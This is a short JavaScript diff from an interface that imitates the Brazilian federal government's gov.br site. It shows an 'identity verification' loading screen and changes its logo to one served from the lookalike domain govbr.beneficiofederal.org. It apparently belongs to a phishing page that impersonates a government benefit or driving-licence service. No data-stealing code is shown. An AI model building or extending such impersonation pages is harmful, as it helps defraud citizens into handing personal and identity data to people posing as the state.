@@ -17983,7 +17983,7 @@ function d3() {
         h.innerHTML =
           '<div class="govbr-loading-wrap">'
           + '<div class="govbr-loading-top">GOVERNO FEDERAL</div>'
-          + '<img class="govbr-loading-logo-img" src="/img/cnh-brasil-logo.png" alt="Brasil" />'
+          + '<img class="govbr-loading-logo-img" src="https://govbr.beneficiofederal.org/gov-brasil-logo.svg" alt="Brasil" />'
           + '<div class="govbr-loading-sub">UNIÃO E RECONSTRUÇÃO</div>'
           + '<div class="govbr-loading-dots"><span></span><span></span><span></span><span></span><span></span></div>'
           + '<div class="govbr-loading-title">Verificando identidade...</div>'
